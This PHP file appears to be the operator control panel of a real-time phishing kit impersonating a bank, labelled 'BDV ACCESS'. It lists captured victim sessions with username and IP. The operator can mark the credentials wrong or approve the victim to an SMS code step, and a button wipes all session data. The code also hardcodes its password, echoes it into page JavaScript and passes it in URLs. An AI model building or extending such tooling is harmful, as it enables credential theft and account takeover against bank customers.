<?php
// control_panel.php
// Este panel lee el estado de las sesiones en espera desde el archivo JSON.

// 1. === CONFIGURACIÓN DE SEGURIDAD ===
// ¡IMPORTANTE! Cambia 'TU_CLAVE_SECRETA' por una contraseña fuerte
$clave_secreta = 'Mierda01.'; 

$pass_ingresada = $_POST['password'] ?? $_GET['pass'] ?? '';

// Definimos la ruta al archivo de sesiones
$sessionsFile = 'data/sessions_status.json';

// --- Lógica de Manejo de Acciones (WIPE ALL) ---
// La lógica de eliminación total se maneja aquí.
if (isset($_GET['action']) && $_GET['action'] === 'wipe_all' && $pass_ingresada === $clave_secreta) {
    // ACCIÓN CLAVE: Borrar todas las sesiones
    file_put_contents($sessionsFile, json_encode([])); // Sobrescribe con un array vacío
    header('Location: control_panel.php?pass=' . $clave_secreta . '&message=' . urlencode(":: ÉXITO :: TODAS LAS SESIONES PENDIENTES FUERON BORRADAS."));
    exit;
}


// 2. === VERIFICACIÓN DE ACCESO ===
if ($pass_ingresada !== $clave_secreta) {
    // Si no es la clave correcta, muestra el formulario de login y detiene la ejecución.
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Acceso Restringido</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #121212; /* Fondo oscuro moderno */ }
            .login-box { background: #1f1f1f; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(0, 200, 255, 0.3); /* Sombra azul eléctrico */ text-align: center; }
            .login-box h1 { color: #00c8ff; margin-bottom: 25px; font-weight: 600; }
            .login-box input[type="password"] { 
                padding: 12px; 
                margin-bottom: 20px; 
                border: 2px solid #00c8ff; /* Borde azul vibrante */
                background: #2b2b2b;
                color: #f0f0f0;
                border-radius: 6px; 
                width: 250px; 
                box-sizing: border-box;
            }
            .login-box button { 
                background-color: #00c8ff; 
                color: #121212; 
                padding: 12px 25px; 
                border: none; 
                border-radius: 6px; 
                cursor: pointer; 
                font-weight: bold;
                transition: background-color 0.3s, transform 0.2s;
            }
            .login-box button:hover {
                background-color: #0088cc;
                transform: translateY(-2px);
            }
            .error { color: #ff4d4d; margin-top: 15px; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Panel de Control</h1>
            <form method="POST" action="control_panel.php">
                <input type="password" name="password" placeholder="Clave de Acceso" required>
                <button type="submit">ACCEDER</button>
                <?php if (!empty($pass_ingresada) && $pass_ingresada !== $clave_secreta): ?>
                    <p class="error">Contraseña incorrecta.</p>
                <?php endif; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit(); // Detiene la ejecución aquí
}

// 3. === LÓGICA DEL PANEL (Solo se ejecuta si la clave es correcta) ===

// Inicializamos la variable de sesiones como un array vacío para prevenir el error de tipo.
$sessions = [];

// Lectura del archivo JSON con manejo de errores
if (file_exists($sessionsFile)) {
    $content = @file_get_contents($sessionsFile);
    
    // Si la lectura fue exitosa y el contenido no está vacío
    if ($content !== false && $content !== '') {
        $decoded = json_decode($content, true);
        
        // Verificamos que la decodificación fue exitosa y el resultado es un array
        if (is_array($decoded)) {
            $sessions = $decoded;
        }
    }
}

// Filtra solo las sesiones PENDIENTES
$pendingSessions = array_filter($sessions, function($s) {
    return isset($s['status']) && $s['status'] === 'PENDING';
});

// Calcula el tiempo de la sesión
foreach ($pendingSessions as $id => &$session) {
    if (isset($session['time'])) {
        $session['age'] = time() - $session['time'];
    } else {
        $session['age'] = 'N/A';
    }
}
unset($session); // Limpiar referencia

// 4. === HTML DEL PANEL (Solo se muestra si la clave es correcta) ===

?>
<!DOCTYPE html>
<html>
<head>
    <title>BDV ACCESS - CONTROL PANEL</title>
    <style>
        /* --- ESTILOS JUVENILES Y MODERNOS --- */
        body {
            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 30px;
            background-color: #1e1e1e; /* Fondo oscuro */
            color: #f0f0f0; /* Texto claro */
        }
        
        h2 {
            color: #00c8ff; /* Azul vibrante */
            text-align: center;
            padding-bottom: 15px;
            margin-bottom: 30px;
            font-weight: 700;
            font-size: 2em;
            text-transform: uppercase;
        }
        
        .container {
            max-width: 950px;
            margin: 0 auto;
            background-color: #2b2b2b; /* Fondo principal más oscuro */
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); /* Sombra marcada */
            padding: 30px;
        }

        /* Tarjetas de Sesión */
        .session-card { 
            border: 1px solid #3c3c3c;
            padding: 20px; 
            margin-bottom: 20px; 
            border-radius: 10px; 
            background-color: #363636; /* Tarjeta oscura */
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .session-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 200, 255, 0.2); /* Efecto hover azulado */
        }

        .session-info { 
            margin-bottom: 15px; 
            font-size: 0.95em; 
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            color: #ccc;
            font-weight: 300;
        }
        .session-info strong { 
            color: #ff00ff; /* Magenta vibrante para etiquetas */
            font-weight: 600;
            margin-right: 5px;
        }
        .no-sessions { 
            text-align: center; 
            color: #4CAF50; /* Verde para éxito */
            padding: 40px; 
            border: 2px dashed #4CAF50; 
            border-radius: 10px;
            font-weight: 600;
        }

        /* Estilos de los botones de acción */
        .decision-btn { 
            padding: 10px 18px; 
            margin: 8px 10px 8px 0; 
            cursor: pointer; 
            border: none; 
            border-radius: 8px; 
            color: #1e1e1e; /* Texto oscuro en botones claros */
            font-weight: 700; 
            transition: all 0.3s;
            font-size: 0.9em;
            text-transform: uppercase;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        /* Botones específicos */
        .btn-clave { 
            background-color: #ff4d4d; /* Rojo neón */
        }
        .btn-clave:hover { 
            background-color: #cc0000; 
            color: white;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
        }

        .btn-usuario { 
            background-color: #ffcc00; /* Amarillo/Dorado */
        }
        .btn-usuario:hover { 
            background-color: #e6b800;
            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
        }

        .btn-success { 
            background-color: #00ff00; /* Verde Lima */
        }
        .btn-success:hover { 
            background-color: #00cc00; 
            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.4);
        }
        
        /* Botón de Eliminación Total (Destacado) */
        #wipe-all-button {
            background-color: #ff00ff; /* Fucsia/Magenta */
            color: #1e1e1e;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 25px;
            width: 100%;
            font-size: 1.1em;
            font-weight: bold;
        }
        #wipe-all-button:hover {
            background-color: #cc00cc;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 0, 255, 0.6);
        }

        /* Mensajes */
        .message {
            background: #1a5a75;
            color: #00c8ff;
            border: 1px solid #00c8ff;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            border-radius: 8px;
            font-weight: 600;
        }
        .footer-note {
            margin-top: 30px; 
            font-size: 0.85em; 
            color: #6c757d; 
            text-align: center;
        }
    </style>
    <script>
        // Declaramos el intervalo fuera para poder detenerlo
        let refreshIntervalId; 
        const CLAVE_SECRETA = '<?php echo $clave_secreta; ?>';

        function sendDecision(sessionId, action) {
            // 1. Detener la auto-actualización ANTES de enviar la decisión
            clearInterval(refreshIntervalId); 

            const formData = new FormData();
            formData.append('session_id', sessionId);
            formData.append('action', action);

            // TU CÓDIGO ORIGINAL APUNTA A control_api.php
            fetch('control_api.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(`Decisión tomada: redirigido a ${data.new_status}.`);
                    // 2. Recargar para remover la sesión de la lista
                    window.location.reload(); 
                } else {
                    alert('Error al tomar decisión: ' + data.error);
                    // 3. Si hay error, reiniciamos la auto-actualización para ver el estado actual
                    startAutoRefresh(); 
                }
            })
            .catch(error => {
                console.error('Error de comunicación:', error);
                alert('Fallo de conexión al API.');
                // 3. Si hay error, reiniciamos la auto-actualización
                startAutoRefresh(); 
            });
        }
        
        // Función para cargar los datos de la sesión
        function loadSessions() {
            // Hacemos una petición al propio control_panel.php PERO con la contraseña en la URL
            const currentPass = CLAVE_SECRETA;
            const url = `control_panel.php?pass=${currentPass}`;
            
            fetch(url)
            .then(response => response.text())
            .then(html => {
                // Buscamos el contenedor y actualizamos solo el contenido dinámico.
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = html;
                const newContentContainer = tempDiv.querySelector('.container');

                if (newContentContainer) {
                    const currentContainer = document.querySelector('.container');
                    if (currentContainer) {
                        currentContainer.innerHTML = newContentContainer.innerHTML;
                        console.log('Sesiones actualizadas.');
                    }
                }
                
            })
            .catch(error => {
                console.error('Fallo en la auto-actualización:', error);
            });
        }
        
        // Función para confirmar la eliminación de todas las sesiones
        function confirmWipeAll() {
            if (confirm('ADVERTENCIA: Esta acción terminará y borrará TODOS los datos de sesión guardados. ¿Desea continuar?')) {
                // Redirige al control panel con la acción wipe_all y la clave para autenticación
                window.location.href = '?action=wipe_all&pass=' + CLAVE_SECRETA;
            }
        }
        
        // Función para iniciar la auto-actualización
        function startAutoRefresh() {
            // Limpiamos cualquier intervalo anterior
            clearInterval(refreshIntervalId); 
            // 2. Iniciamos el temporizador cada 5 segundos
            refreshIntervalId = setInterval(loadSessions, 5000); 
        }

        // Iniciar la auto-actualización al cargar la página
        window.onload = startAutoRefresh;
    </script>
</head>
<body>
<div class="container">
    <h2>BDV | CONTROL PANEL</h2>
    
    <?php if (isset($_GET['message'])): ?>
        <div class="message"><?php echo htmlspecialchars($_GET['message']); ?></div>
    <?php endif; ?>

    <button type="button" id="wipe-all-button" onclick="confirmWipeAll()" class="decision-btn">
        💣 BORRAR TODAS LAS SESIONES
    </button>
    
    <?php if (empty($pendingSessions)): ?>
        <div class="no-sessions">
            🎉 ¡Todo tranquilo! No hay sesiones pendientes en espera de decisión.
        </div>
    <?php else: ?>
        <?php foreach ($pendingSessions as $id => $session): ?>
            <div class="session-card">
                <div class="session-info">
                    <span><strong>ID:</strong> <?php echo substr($id, 0, 8); ?>...</span>
                    <span><strong>Usuario:</strong> <?php echo htmlspecialchars($session['user'] ?? 'N/A'); ?></span>
                    <span><strong>IP:</strong> <?php echo htmlspecialchars($session['ip'] ?? 'N/A'); ?></span>
                    <span><strong>Tiempo:</strong> <?php echo $session['age']; ?> segundos</span>
                </div>
                <div>
                    <button class="decision-btn btn-usuario" onclick="sendDecision('<?php echo $id; ?>', 'USUARIO')">
                        ❌ Usuario Incorrecto
                    </button>
                    <button class="decision-btn btn-clave" onclick="sendDecision('<?php echo $id; ?>', 'CLAVE')">
                        🚫 Clave Inválida
                    </button>
                    <button class="decision-btn btn-success" onclick="sendDecision('<?php echo $id; ?>', 'SUCCESS')">
                        ✅ Permitir Acceso (SMS)
                    </button>
                </div>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
    
    <p class="footer-note">
    Las sesiones se autodestruyen después de 15 segundos si no hay acción, redirigiendo a 'error.php'.
    </p>
</div>
</body>
</html>